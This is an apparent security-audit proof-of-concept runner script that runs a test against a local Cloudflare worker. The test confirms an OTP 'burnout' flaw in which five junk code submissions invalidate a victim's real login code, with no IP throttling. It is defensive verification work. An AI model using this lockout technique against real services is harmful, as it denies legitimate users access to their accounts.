#!/usr/bin/env bash
# p10-005 PoC runner — executes poc.test.ts against the real worker in workerd
# (@cloudflare/vitest pool + local D1 seeded with production migrations).
#
# Usage: bash poc.sh [repo-root]   (default: auto-detect from script location)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="${1:-$(cd "$SCRIPT_DIR/../../.." && pwd)}"
WORKERS_DIR="$REPO_ROOT/site/workers"
EVDIR="$SCRIPT_DIR/evidence"
mkdir -p "$EVDIR"

TMP_TEST="$WORKERS_DIR/tests/p10-005-burnout-poc.adversarial.test.ts"
cleanup() { rm -f "$TMP_TEST"; }
trap cleanup EXIT

cp "$SCRIPT_DIR/poc.test.ts" "$TMP_TEST"

{
  echo "repo_root: $REPO_ROOT"
  echo "worker: site/workers/src/worker.ts via @cloudflare/vitest pool (workerd)"
  echo "d1: local miniflare D1 'omg-licensing-test', production migrations applied (incl. 012_secure_otp attempt_count)"
  echo "config: TURNSTILE_SECRET_KEY unset (default posture => fail-open), AUTH_RATE_LIMITER declared but unwired, EMAIL binding stubbed 1:1 with delivery"
} > "$EVDIR/env-info.txt"

echo "== healthcheck: baseline auth suite sanity (schema applies, worker boots) ==" | tee "$EVDIR/healthcheck.log"
(cd "$WORKERS_DIR" && npx vitest run tests/auth-and-guard.test.ts --reporter=basic 2>&1 | tail -8) | tee -a "$EVDIR/healthcheck.log" || true
# NOTE: reporter name differs across vitest majors; if basic fails this is
# cosmetic only — exploit run below is authoritative.

echo "== exploit run =="
set +e
(cd "$WORKERS_DIR" && npx vitest run tests/p10-005-burnout-poc.adversarial.test.ts --reporter=verbose 2>&1) | tee "$EVDIR/exploit.log"
VITEST_RC=${PIPESTATUS[0]}
set -e

grep -E "p10-005" "$EVDIR/exploit.log" > "$EVDIR/impact.log" || true

# Structured verdict for poc-executor: confirmed iff the victim's fresh inbox
# code was rejected after the attacker's 5 junk submissions with zero 429s.
if grep -q 'p10-005 replacement-code logins: cycle1: HTTP 401, cycle2: HTTP 401' "$EVDIR/impact.log" \
   && grep -q 'IP throttled (429): 0' "$EVDIR/impact.log"; then
  STATUS="confirmed"
  EVIDENCE="victim's legitimate OTP from inbox rejected with 401 'Invalid or expired code' after attacker submitted only 5 arbitrary wrong codes for the email; both replacement codes burned identically across cycles; 15 attacker verify-code requests with zero IP throttling"
else
  STATUS="failed"
  EVIDENCE="burnout did not reproduce as expected (see evidence/exploit.log)"
fi

echo "{\"status\": \"$STATUS\", \"evidence\": \"$EVIDENCE\", \"notes\": \"vitest rc=$VITEST_RC; real worker.fetch in workerd against local D1 with production migrations\"}"
